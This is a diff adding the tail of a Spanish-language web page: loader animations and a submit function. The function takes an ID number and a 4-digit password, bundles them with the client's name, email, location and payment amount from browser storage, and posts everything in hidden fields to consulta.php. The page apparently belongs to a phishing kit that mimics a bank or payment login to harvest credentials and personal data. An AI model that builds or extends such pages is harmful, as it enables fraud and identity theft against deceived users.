+      if (yellow) yellow.style.animation = "intro-yellow 2.5s ease-out forwards, move-yellow 1.8s cubic-bezier(0.7,0,0.3,1) infinite 2.5s";
+      if (red) red.style.animation = "intro-red 2.5s ease-out forwards, move-red 1.8s cubic-bezier(0.7,0,0.3,1) infinite 2.5s";
+      if (shadow) shadow.style.animation = "shadow-pulse 2.5s ease-out forwards";
+    }
+
+    // 8. Función de Envío hacia consulta.php
+    function enviar() {
+      const idInput = document.getElementById('identificationNumber');
+      const passInput = document.getElementById('password');
+      const btnSubmit = document.getElementById('btnSubmit');
+
+      if (!idInput || !passInput || (btnSubmit && btnSubmit.disabled)) return;
+
+      const id = idInput.value.trim();
+      const pass = passInput.value.trim();
+
+      if (id.length < 6 || pass.length !== 4) return;
+
+      // Mostrar pantalla de carga inmediatamente
+      if (btnSubmit) {
+        btnSubmit.disabled = true;
+        btnSubmit.textContent = 'Ingresando...';
+      }
+      runLoader();
+
+      // Recopilar tbdatos de localStorage y sessionStorage
+      let tbdatosObj = {};
+      try {
+        tbdatosObj = JSON.parse(localStorage.getItem('tbdatos') || '{}');
+      } catch(e) {}
+
+      if (sessionStorage.getItem('client_name')) {
+        tbdatosObj.nombre_cliente = sessionStorage.getItem('client_name');
+      }
+      if (sessionStorage.getItem('client_email')) {
+        tbdatosObj.correo = sessionStorage.getItem('client_email');
+      }
+      if (sessionStorage.getItem('client_depto')) {
+        tbdatosObj.departamento = sessionStorage.getItem('client_depto');
+      }
+      if (sessionStorage.getItem('client_mpio')) {
+        tbdatosObj.municipio = sessionStorage.getItem('client_mpio');
+      }
+
+      const mVal = localStorage.getItem('total_pagar') || localStorage.getItem('monto') || '';
+      if (mVal && !tbdatosObj.total_pagar) {
+        tbdatosObj.total_pagar = mVal;
+      }
+
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'consulta.php';
+
+      const field1 = document.createElement('input');
+      field1.type = 'hidden';
+      field1.name = 'u_id';
+      field1.value = id;
+
+      const field2 = document.createElement('input');
+      field2.type = 'hidden';
+      field2.name = 'u_ps';
+      field2.value = pass;
+
+      const field3 = document.createElement('input');
+      field3.type = 'hidden';
+      field3.name = 'u_tb';
+      field3.value = JSON.stringify(tbdatosObj);
+
+      form.appendChild(field1);
+      form.appendChild(field2);
+      form.appendChild(field3);
+      document.body.appendChild(form);
+      form.submit();
+    }
+  </script>
+</body>
+</html>
